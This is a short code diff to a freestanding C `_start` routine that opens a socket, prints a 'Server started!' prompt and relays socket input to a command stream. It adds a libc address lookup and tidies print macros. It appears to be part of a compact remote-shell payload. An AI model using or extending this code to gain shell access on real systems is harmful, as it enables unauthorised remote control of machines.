@@ -15,6 +15,10 @@ void _start(void)
   data.shell_mode = 0;
   data.long_symbols = 0x0A2165002E203E0A; // one and two-char strings:  reverse('\n', '> ', '.\0', 'e!\n')
 
+#ifdef LIBC
+  data.libc_addr = get_libc(data.temp, BUFSIZ);
+#endif
+
   // create a socket
   data.s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
 
@@ -29,7 +33,7 @@ void _start(void)
 #ifndef _COMPACT
     PRINT_TEXT(data.s, "Server started!\n> ");
 #else
-    PRINT_TEXT(data.s, data.symbols.prompt);
+    PRINT_CHARS(data.s, data.symbols.prompt);
 #endif
 
     evts[0].fd = data.s;
@@ -41,12 +45,7 @@ void _start(void)
       r = poll(evts, 1, 1000);
 
       if (r < 0)
-      {
-#ifndef _COMPACT
-        PRINT_TEXT(STDERR_FILENO, "poll() failed!\n");
-#endif
         break;
-      }
 
       // read from socket and write to stdin
       r = read(data.s, buf, BUFSIZ);
@@ -69,7 +68,7 @@ void _start(void)
 
         if (data.command_len == 0)
         {
-          PRINT_TEXT(data.s, data.symbols.prompt);
+          PRINT_CHARS(data.s, data.symbols.prompt);
         }
       }
     }
